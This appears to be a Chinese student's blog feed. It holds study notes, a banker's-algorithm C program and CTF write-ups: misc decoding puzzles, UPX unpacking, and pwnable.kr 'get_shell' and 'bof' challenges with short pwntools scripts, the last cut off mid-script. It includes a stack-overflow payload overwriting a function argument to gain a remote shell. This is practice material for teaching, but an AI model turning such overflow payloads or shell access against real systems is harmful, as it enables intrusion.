class="line">f1 = 0;</span><br><span class="line">for(i = 0;i&lt;n;i++)//&#123;</span><br><span class="line">if(flag1[i]==1)f1++;</span><br><span class="line">if(f1==n)&#123;</span><br><span class="line">printf(&quot;\n此次操作为安全操作\n其中一种安全序列为：&quot;);</span><br><span class="line">for(j = 0;j&lt;n;j++)printf(&quot;%d &quot;,c1[j]);</span><br><span class="line">printf(&quot;\n是否继续进行试探[Y/N]:&quot;) ;</span><br><span class="line">getchar();</span><br><span class="line">scanf(&quot;%c&quot;,&amp;ch);</span><br><span class="line">if(ch == &#x27;Y&#x27; || ch == &#x27;y&#x27;)&#123;</span><br><span class="line">for(int i1=0;i1&lt;n;i1++)</span><br><span class="line">for(int j1=0;j1&lt;n;j1++)&#123;</span><br><span class="line">C[i1][j1]=C1[i1][j1];</span><br><span class="line">B[i1][j1]=B1[i1][j1];</span><br><span class="line">A[i1][j1]=A1[i1][j1];</span><br><span class="line">&#125;</span><br><span class="line">for(int i2=0;i2&lt;m;i2++)a[i2]=a1[i2];</span><br><span class="line">goto to2;</span><br><span class="line">&#125;</span><br><span class="line">/*printf(&quot;\n安全序列+1：&quot;);</span><br><span class="line">for(j = 0;j&lt;n;j++)printf(&quot;%d &quot;,c[j]+1);*/</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">printf(&quot;\n此次操作使系统处于不安全状态，驳回该操作\n&quot;);</span><br><span class="line">goto to2; </span><br><span class="line">&#125;</span><br><span class="line">//&#125; </span><br><span class="line">printf(&quot;存在死锁&quot;);</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int end()</span><br><span class="line">&#123;</span><br><span class="line">char ch;</span><br><span class="line">printf(&quot;\n是否继续进行下一组测试？[Y/N]:&quot;);</span><br><span class="line">getchar();</span><br><span class="line">scanf(&quot;%c&quot;,&amp;ch);</span><br><span class="line">printf(&quot;*--------------------------------------------------------------------------------*\n&quot;);</span><br><span class="line">if(ch == &#x27;Y&#x27; || ch == &#x27;y&#x27;)return 1;</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例图：</p><p><img src="image-20211215215456357.png" alt="image-20211215215456357"></p><p>题目要求解析：</p><p><img src="image-20211215214324872.png" alt="image-20211215214324872"></p><p>参考链接：<a href="https://blog.csdn.net/zimojiang/article/details/80861792">https://blog.csdn.net/zimojiang/article/details/80861792</a></p><p>若存在bug，欢迎指正^_^</p><p>wx : xy1724252720</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>xiaoxiaoNote</title>
      <link href="/2021/11/06/xiaoxiaoxy-Note/"/>
      <url>/2021/11/06/xiaoxiaoxy-Note/</url>
      
        <content type="html"><![CDATA[<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>代码中存在中文时报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Non-ASCII character &#x27;\xe8&#x27; in file D:/PyCharmProject/TempConvert.py on line 2, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for details</span><br></pre></td></tr></table></figure><p>原因：注释里面出现了中文，而 Python 支持的 ASCII 码无中文。</p><br/><p>解决方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line"># 这样也行</span><br><span class="line"># coding:utf-8 </span><br></pre></td></tr></table></figure><p>注意：本行要添加在源代码的第一行</p><br/><br/><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p><br/><br/><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="nbsp-nbsp-nbsp-nbsp-phpstorm"><a href="#nbsp-nbsp-nbsp-nbsp-phpstorm" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;phpstorm"></a>&nbsp;&nbsp;&nbsp;&nbsp;phpstorm</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：不想选择评估免费版本的话，安装好后不要动，先去淘宝买激活码</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（很多软件都可以通过淘宝买激活码的方式获取专业版使用权限。白嫖党请自行去寻找资源）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（基本教程）：<a href="https://zhuanlan.zhihu.com/p/112353790">PhpStorm的使用教程（本地运行PHP+远程开发+快捷键） - 知乎 (zhihu.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（汉化教程）：<a href="https://blog.csdn.net/weixin_46397725/article/details/107443128">https://blog.csdn.net/weixin_46397725/article/details/107443128</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（进阶教程）：<a href="https://blog.csdn.net/fangkang7/article/details/112383620">https://blog.csdn.net/fangkang7/article/details/112383620</a></p><h3 id="nbsp-nbsp-nbsp-nbsp-wampserver"><a href="#nbsp-nbsp-nbsp-nbsp-wampserver" class="headerlink" title="&nbsp;&nbsp;&nbsp;&nbsp;wampserver"></a>&nbsp;&nbsp;&nbsp;&nbsp;wampserver</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/ba_qi/article/details/102736014">wampserver下载安装使用教程_空心人的博客-CSDN博客_wampserver</a></p><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><p>1、各个课设、eda大作业ppt（emm…老师叫我演讲╭(°A°`)╮）、期末备考</p><p>2、重温《程序员的自我修养》（编译链接与库）</p><p>（1）了解Linux ELF文件<br>（2）分析掌握栈溢出原理理解函数参数的传递过程栈空间变化<br>（3）掌握查找ROPgadget、32位和64位的exp构造<br>（4）掌握返回导向编程ROP，ret2libc、ret2_dl_resolve<br>（5）掌握linux系统延迟绑定机制：GOT、PLT查看libc库函数地址</p><p>3、计算机网络，计算机组成原理，计算机操作系统（逃不过(°A°`)）</p><p>4、至少一周研究一道pwn题</p><p>5、姐，还有些问题有空记得教我一下(*σ´∀`)σ</p><p>1）、C语言函数调用规定 *<br>2）、Pwnlib<br>3）、shellcraft *<br>4）、打shellcode</p><p> 2021/11/06</p><p> 软考终于结束了，晚上去跑5公里庆祝一下^_^（好久没跑了，不知道还跑不跑得动）。至于软考的结果怎样不好说，就算上午的选择题侥幸能及格，下午的大题也很难过吧（毕竟下午的大题我就在上午考完后只用中午休息的时间学了一个小时，虽然效率极高，但毕竟只有一个小时），简而言之那便是——能过就是奇迹。</p><p>​        没事，虽然过不了，但收获还是挺大的，至少我对这网络工程师的考察内容已经有了一个比较清晰的框架，之后的学习中只需要按这个框架逐步地积累知识就可以了。</p><p>​        好了，先不管这软考的事了，丢到寒假再准备吧，下周二就是明月网安招新赛了，这周末挤点时间出来打点攻防世界上的题目吧， ε=(´ο｀*)))唉，作业好多啊，抄都抄不完。</p><p>​        ok，最后把想要做的事记录一下吧，以免忘记，按重要程度排序：</p><p>​        1、ctf招新赛（所以最近我的博客应该都会有题目更新）</p><p>​        2、java期中考试，得抓紧复习</p><p>​        3、装载&amp;见识一下kali Linux操作系统（不得不说，这红色的字确实帅）</p><p><img src="image-20211106181449999.png" alt="image-20211106181449999"></p><p>​        4、期末备考（及格万岁！）</p><p><img src="image-20211106180354153.png" alt="image-20211106180354153"></p><p>​        5、学习网络工程师相关知识，通过这段时间对网络工程师的备考来看，不得不说这些知识对我来说是很有用的。</p><p>​        6、英语六级（寒假再看吧）</p><p><img src="image-20211106180510834.png" alt="image-20211106180510834"></p><p>2021/11/09</p><p>简单记录一下今天下午的比赛吧：</p><p>接下来记录的东西，我自己看得懂就行吧</p><p>1、windows管理员权限，修改系统文件</p><p>2、跟舍友组队打新手赛，2:1开，理论题做不了，打的都是实践题</p><p>3、网络弄崩心态：校园网一直断，不连校园网无法提交flag查看是否正确，只能一会儿热点一会儿校园网，且校园网连的比较慢，比赛场地位置不太好吧，校园网信号差</p><p>4、简单pwn题没调出来：好像远端服务器连不上去，不说太多，留个图吧</p><p><img src="image-20211109222354287.png" alt="image-20211109222354287"></p><p>5、emm…</p><p>6、最后跟舍友一起打了300分，不知道能不能排上号，但愿能进校CTF队吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>misc</title>
      <link href="/2021/11/02/misc/"/>
      <url>/2021/11/02/misc/</url>
      
        <content type="html"><![CDATA[<p><strong>this_is_flag:</strong></p><p>flag就在题目描述中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;th1s_!s_a_d4m0_4la9&#125;</span><br></pre></td></tr></table></figure><p><strong>pdf：</strong></p><p>下载附件-&gt;<a href="https://smallpdf.com/cn/pdf-converter">PDF转换器 – 在线免费转换PDF文件 (smallpdf.com)</a>-&gt;转换为ppt格式下载再打开即可拖动，转换成word再下载也能看到字</p><p><img src="image-20211102134142425.png" alt="image-20211102134142425"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;security_through_obscurity&#125;</span><br></pre></td></tr></table></figure><p><strong>如来十三掌：</strong></p><p>打开附件：</p><p><img src="image-20211102134230550.png" alt="image-20211102134230550"></p><p>复制文字，进入<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅 (keyfc.net)</a></p><p>粘贴文字并在前加上佛曰：</p><p><img src="image-20211102134250167.png" alt="image-20211102134250167"></p><p>得到一串字符，复制，百度搜索rot-13解码，这里直接复制链接在此：<a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">ROT13解码计算器 - 计算专家 (jisuan.mobi)</a></p><p><img src="image-20211102134317437.png" alt="image-20211102134317437"></p><p>再将解码结果进行Base64解码，解码器链接：<a href="https://tool.ip138.com/base64/">base64解码 base64编码 在线base64解码/编码工具 (ip138.com)</a></p><p><img src="image-20211102134332825.png" alt="image-20211102134332825"></p><p>得到flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure><p><strong>give_you_flag</strong>：</p><p>打开附件，发现动态图片，且会有一张二维码闪过，使用Snipaste（截图挺好用的，推荐下载，去Snipaste官网下载v2.6.6-Beta (2021.08.14)版本64-bit即可，使用方法自己摸索）工具，截得此图：</p><p><img src="image-20211102213300087.png" alt="image-20211102213300087"></p><p>之后再随便找一张二维码，抠出定位点</p><p><img src="image-20211102213319965.png" alt="image-20211102213319965"></p><p>拖到指定位置扫码即可</p><p><img src="image-20211102213335884.png" alt="image-20211102213335884"></p><p><img src="image-20211102213346239.png" alt="image-20211102213346239"></p><p>ok，手机扫出来了</p><p><img src="image-20211102213407832.png" alt="image-20211102213407832"></p><p>这个方法是我姐教我的，而且她说这类二维码题是CTF竞赛中的签到题，好吧，看来是我太菜了⊙∀⊙</p><p>解法二：</p><p><a href="https://blog.csdn.net/qq_40481505/article/details/89425543">https://blog.csdn.net/qq_40481505/article/details/89425543</a></p><p><a href="https://blog.csdn.net/tqydyqt/article/details/101988854">https://blog.csdn.net/tqydyqt/article/details/101988854</a></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</span><br></pre></td></tr></table></figure><p><strong>stegano</strong>：</p><p>下载火狐浏览器及附件，用火狐浏览器打开文件</p><p><img src="image-20211102135248023.png" alt="image-20211102135248023"></p><p>F12打开控制台，输入<strong>document.documentElement.textContent</strong>得到以下结果：</p><p><img src="image-20211102135314037.png" alt="image-20211102135314037"></p><p><strong>BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</strong></p><p>发现一大段AABABA样式的东西，猜测是01但是这些有分割，能想到的只有摩斯密码有分割的，于是尝试改成<strong>摩斯密码</strong></p><p>简单地写了一个转换器：</p><p><img src="image-20211102135403685.png" alt="image-20211102135403685"></p><p><img src="image-20211102135413534.png" alt="image-20211102135413534"></p><p><img src="image-20211102135424328.png" alt="image-20211102135424328"></p><p>百度上找一个摩斯码解码器得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure><p><strong>坚持60s</strong>：</p><p>下载并打开XJad(要压缩包的话联系我wx：xy1724252720)，反编译本题附件</p><p><img src="image-20211102135631579.png" alt="image-20211102135631579"></p><p>至这个目录打开文件，一个一个查找，发现flag在这里面</p><p><img src="image-20211102135646777.png" alt="image-20211102135646777"></p><p><img src="image-20211102135655848.png" alt="image-20211102135655848"></p><p>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p><p>看到flag，复制过去</p><p>提交不对，看见等号，想是不是<strong>base64</strong>，解码还真是！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure><p><strong>gif：</strong></p><p>下载附件，解压至桌面，打开解压出来的文件夹：</p><p><img src="image-20211102135741412.png" alt="image-20211102135741412"></p><p>想到01代码，以白为0，以黑为1，进行转换</p><p>0110011001101100011000010110011101111011010001100111010101001110010111110110011101101001010001100111110101111101</p><p>[在线二进制转换字符串<a href="http://www.txttool.com/t/?id=Mzky">EN] - 转换 (txttool.com)</a></p><p><img src="image-20211102135813253.png" alt="image-20211102135813253"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure><p><strong>掀桌子：</strong></p><p>题目中出现了一串神秘的字符串：</p><p>c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2</p><p>发现是数字与abcdef的组合，而我们熟知的16进制不就是由这些符号组成的吗？</p><p>接着我用以往解题的思路，拿去转换为二进制，再将二进制转字符，发现结果不对</p><p>最后通过查找别人的解法得知该题中得以两个16进制数为一组表示一个字符，但每两个二进制数的组合都大于128，而未扩展的ascll码值字符取值区间为0-128，所以要对每两个16进制数进行减128处理，再换为字符</p><p><img src="image-20211102174948168.png" alt="image-20211102174948168"></p><p>然后便有了以上脚本，运行如下：</p><p><img src="image-20211102175006281.png" alt="image-20211102175006281"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&#x27;</span></span><br><span class="line">kk = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>)</span><br><span class="line">b = re.findall(kk,a)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)-<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>结合flag格式得出flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hjzcydjzbjdcjkzkcugisdchjyjsbdfr&#125;</span><br></pre></td></tr></table></figure><p>其中的re模块、findall（）函数等请自行百度查阅了解</p><p><a href="https://blog.csdn.net/qq_36556893/article/details/89182067">https://blog.csdn.net/qq_36556893/article/details/89182067</a></p><p><strong>ext3：</strong></p><p>首先，下载7-Zip</p><p>链接：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p><img src="image-20211106231651844.png" alt="image-20211106231651844"></p><p>安装过程选项全默认即可，期间可能会有小差错，总之最后去你选定的安装路径查看是否安装完成，我的是下载在C盘下的Program Files文件夹中</p><p><img src="7-Zip.png" alt="7-Zip"></p><p>打开该路径</p><p><img src="image-20211106232237594.png" alt="image-20211106232237594"></p><p>有这些文件说明下载成功</p><p>接着找到已经下载好的本题的附件</p><p><img src="image-20211106232612472.png" alt="image-20211106232612472"></p><p>接着在最近下载中出现了该文件夹</p><p><img src="image-20211106232656439.png" alt="image-20211106232656439"></p><p>双击打开，搜索中输入flag并按下回车</p><p><img src="image-20211106232802773.png" alt="image-20211106232802773"></p><p>得到flag.txt</p><p><img src="image-20211106232839219.png" alt="image-20211106232839219"></p><p>打开看到一串字符，以 ” = “ 结尾，说明是base64加密，百度上查找base64解密即可得到flag</p><p><img src="image-20211106233059315.png" alt="image-20211106233059315"></p><p>以上是Windows中的解法，Linux下的解法以后再看写不写吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sajbcibzskjjcnbhsbvcjbjszcszbkzj&#125;</span><br></pre></td></tr></table></figure><p><strong>SimpleRAR：</strong></p><p>下载附件，解压附件，得到flag.txt，打开看了一下⊙∀⊙！</p><p><img src="image-20211107124023951.png" alt="image-20211107124023951"></p><p><img src="image-20211107122638576.png" alt="image-20211107122638576"></p><p>然后就去百度看了一下，了解了一下解题过程</p><p><a href="https://blog.csdn.net/tqydyqt/article/details/101992518">https://blog.csdn.net/tqydyqt/article/details/101992518</a></p><p><a href="https://blog.csdn.net/xiaolong22333/article/details/107498232">https://blog.csdn.net/xiaolong22333/article/details/107498232</a></p><p>首先去<a href="http://www.winhex.com下载winhex/">www.winhex.com下载winhex</a></p><p><img src="%5Cimage-20211107122959047.png" alt="image-20211107122959047"></p><p><img src="image-20211107123042220.png" alt="image-20211107123042220"></p><p>打开winhex将本题附件压缩包拖动至winhex</p><p><img src="image-20211107123418763.png" alt="image-20211107123418763"></p><p>这里可以看到flag is not here和一个png格式的图片，</p><p><img src="image-20211107123743899.png" alt="image-20211107123743899"></p><p>接着</p><p>接着的以后写</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>get_shell</title>
      <link href="/2021/10/28/get-shell/"/>
      <url>/2021/10/28/get-shell/</url>
      
        <content type="html"><![CDATA[<p>首先，我们看到题目：</p><p><img src="image-20211028122944618.png" alt="image-20211028122944618"></p><p>下载附件&amp;获取场景：</p><p><img src="image-20211028122959729.png" alt="image-20211028122959729"></p><p>因为题目中说运行即可拿到shell，那我们就直接进虚拟机连接到该ip去看看</p><p>发现nc指令连不上去，之前用ssh也连不上，根本没反应,我姐说可能是防火墙的原因 </p><p><img src="image-20211028123019714.png" alt="image-20211028123019714"></p><p>那我们换个思路，写个脚本试试：</p><p><img src="image-20211028123056923.png" alt="image-20211028123056923"></p><p>运行该脚本：</p><p><img src="image-20211028123302612.png" alt="image-20211028123302612"></p><p>$ ls 查看当前目录文件，发现flag，cat一下  $ cat flag 发现能够得到flag，提交即可</p><p>flag：cyberpeace{c2414b5c0583aef5e2d7b2bbd7a98a83}</p><p><strong>拓展：</strong></p><p>但题目说运行即可拿到flag，我们并没有运行本题附件，接下来下载附件运行一下</p><p><img src="image-20211028123403958.png" alt="image-20211028123403958"></p><p>这是我/Desktop目录下的文件：</p><p><img src="image-20211028123422849.png" alt="image-20211028123422849"></p><p>显然，这个附件帮我拿到了我自己电脑的shell，所以我只能查看我自己电脑上的文件</p><p>这时我们打开ida反编译一下附件：</p><p>打开main函数后可以发现，这里直接调用了system（）函数获取shell</p><p><img src="image-20211028123450549.png" alt="image-20211028123450549"></p><p><strong>综述：</strong></p><p>本地执行本题附件只会拿到当前机器的shell，而该题的flag存在远端服务器上，并未存储在我们的个人PC上，所以我们要连接到远端服务器上，去服务器上执行该文件才能在服务器上拿到该题的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="string">&#x27;63031&#x27;</span>)     <span class="comment">#远程连接</span></span><br><span class="line">p.interactive()                           <span class="comment">#接收服务器的交互</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：cyberpeace&#123;c2414b5c0583aef5e2d7b2bbd7a98a83&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>flag</title>
      <link href="/2021/10/28/flag/"/>
      <url>/2021/10/28/flag/</url>
      
        <content type="html"><![CDATA[<p><strong>1：</strong>拿到题目，借助网址下载相应文件<strong>1：</strong>拿到题目，借助网址下载相应文件</p><p><img src="image-20211028121819871.png" alt="image-20211028121819871"></p><p><img src="image-20211028121841578.png" alt="image-20211028121841578"></p><p>命令1：wget <a href="http://pwnable.kr/bin/flag">http://pwnable.kr/bin/flag</a></p><p><strong>2：</strong>通过网络资料知：</p><p>  “用个16进制查看器看一下,是elf文件,并且加了upx壳,要脱下upx壳才好分析”</p><p><img src="image-20211028121911536.png" alt="image-20211028121911536"></p><p>这16进制查看器我不知道咋弄的，该图也是从网上搬来的。</p><p><strong>3：</strong>由于upx不为自带文件，需自行下载，相应Linux指令附着于下：</p><p>（1）：下载upx：命令2：</p><p>wget <a href="https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz">https://github.com/upx/upx/releases/download/v3.95/upx-3.95-amd64_linux.tar.xz</a></p><p>（2）：解压二进制：命令3：</p><p>tar -Jxf upx*.tar.xz</p><p>（3）：为了方便使用移动 upx 到系统变量目录，如果不愿意使用 root 的话可以将 upx 目录添加到环境变量：命令4：</p><p>sudo cp upx*/upx /usr/bin</p><p><strong>4：</strong>利用upx 进行解压，upx -d filename：</p><p><img src="image-20211028121940998.png" alt="image-20211028121940998"></p><p>基本操作不做过多赘述，实在不理解请自行百度查找（其实我也不理解，会用就行）</p><p>命令6：upx -d flag</p><p>5：查看文件是否下载至当前路径（我的当前路径为Desktop（桌面））：</p><p><img src="image-20211028122002870.png" alt="image-20211028122002870"></p><p>此处进行了权限赋予操作（赘余操作，可不必进行）</p><p>命令7：chmod 777 flag</p><p><strong>6：</strong>运用file命令查看flag文件的位数情况（32位 or 64位）：</p><p><img src="image-20211028122020834.png" alt="image-20211028122020834"></p><p>命令8：file flag</p><p>由此得知flag文件为64位文件</p><p><strong>7：</strong>现在只需将flag文件拖动至Windows界面中的64位ida中进行反编译即可，具体操作在此不做赘述（拖动文件会吧？不用教了吧，拖不出来的话考虑换一个虚拟机吧）</p><p><strong>8：</strong>接下来就是常规操作，按下ok，找到main函数按下F5，结果如下：</p><p><img src="image-20211028122043880.png" alt="image-20211028122043880"></p><p><strong>9：</strong>分析main函数，并无特别之处，但那flag格外显眼，经合情推理，flag内置于内存之中，这时我们只需双击flag便可进入如下界面，并发现flag地址处存储的一组字符串：</p><p><img src="image-20211028122118485.png" alt="image-20211028122118485"></p><p>UPX…? sounds like a delivery service但这并不是flag</p><p>10：双击字符串后进入另一界面，此时flag便出现了：</p><p><img src="image-20211028122203449.png" alt="image-20211028122203449"></p><p>正解flag：UPX…? sounds like a delivery service :)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag：UPX...? sounds like a delivery service :)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bof</title>
      <link href="/2021/10/28/bof/"/>
      <url>/2021/10/28/bof/</url>
      
        <content type="html"><![CDATA[<p>1：先看题目</p><p><img src="clip_image002.jpg" alt="clip_image002"></p><p>Windows:将地址复制粘贴至浏览器即可下载</p><p>Linux：开启root权限，使用wget指令即可下载本题文件</p><p>  $ wget <a href="http://pwnable.kr/bin/bof">http://pwnable.kr/bin/bof</a></p><p>  $ wget <a href="http://pwnable.kr/bin/bof.c">http://pwnable.kr/bin/bof.c</a></p><p>2：Linux下使用file指令查看bof文件信息</p><p><img src="clip_image003.png" alt="clip_image003"></p><p>32-bit可知bof文件为32位文件</p><p>3：打开32位ida，将bof二进制可执行文件拖入其中</p><p>进行一些基本操作可得到如下结果，如图</p><p>图一：main函数</p><p>图二：func函数</p><p><img src="clip_image005.jpg" alt="clip_image005"></p><p><img src="clip_image006.png" alt="clip_image006"></p><p>简要分析可知：在远端服务器执行该文件，并且当a1的值为-889275714时，即可拿到远端服务器的shell，进而得到你想要的flag，to win</p><p>5：</p><p><img src="clip_image007.png" alt="clip_image007"></p><p>Gdb打开bof文件</p><p><img src="clip_image008.png" alt="clip_image008"></p><p>在main函数处设置断点并执行文件</p><p><img src="clip_image009.png" alt="clip_image009"></p><p><img src="clip_image011.jpg" alt="clip_image011"></p><p><img src="clip_image013.jpg" alt="clip_image013"></p><p>在idamain函数中使用Hex…我们发现这两个数据相同，自己领会</p><p><img src="clip_image014.png" alt="clip_image014"></p><p>刚运行至我们设置的断点处，指针停在了这个位置</p><p><img src="clip_image015.png" alt="clip_image015"></p><p>离我们的func函数仅有三步之遥</p><p><img src="clip_image016.png" alt="clip_image016"></p><p>此时我们执行四次si指令即可进入func函数，结果如下</p><p><img src="clip_image017.png" alt="clip_image017"></p><p>查看栈段：</p><p><img src="clip_image019.jpg" alt="clip_image019"></p><p>得到内存的栈段中func函数的末尾地址0xffffd130</p><p>利用x/50wx 0xffffd130，从栈地址0xffffd130向高位打印50个内存地址（一个地址四字节）</p><p><img src="clip_image021.jpg" alt="clip_image021"></p><p>结果如上图，第一个0x61616161便是我们输入的数组s的初始值（即s[0]），0xdeadbeef即为我们main函数中的传入func的参数，因此我们只需要输入80-4c = 34（转换为十进制即为52），输入52个任意字符外加目标字符“0xCAFEBABE”即可解决此题</p><p>构造的脚本如下：</p><p><img src="clip_image022.png" alt="clip_image022"></p><p>结果如下：</p><p><img src="clip_image023.png" alt="clip_image023"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*                          <span class="comment">#导入pwn模块</span></span><br><span class="line">p = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)             <span class="comment">#连接远端服务器</span></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>*(<span class="number">0x34</span>) + p32(<span class="number">0xcafebabe</span>))  <span 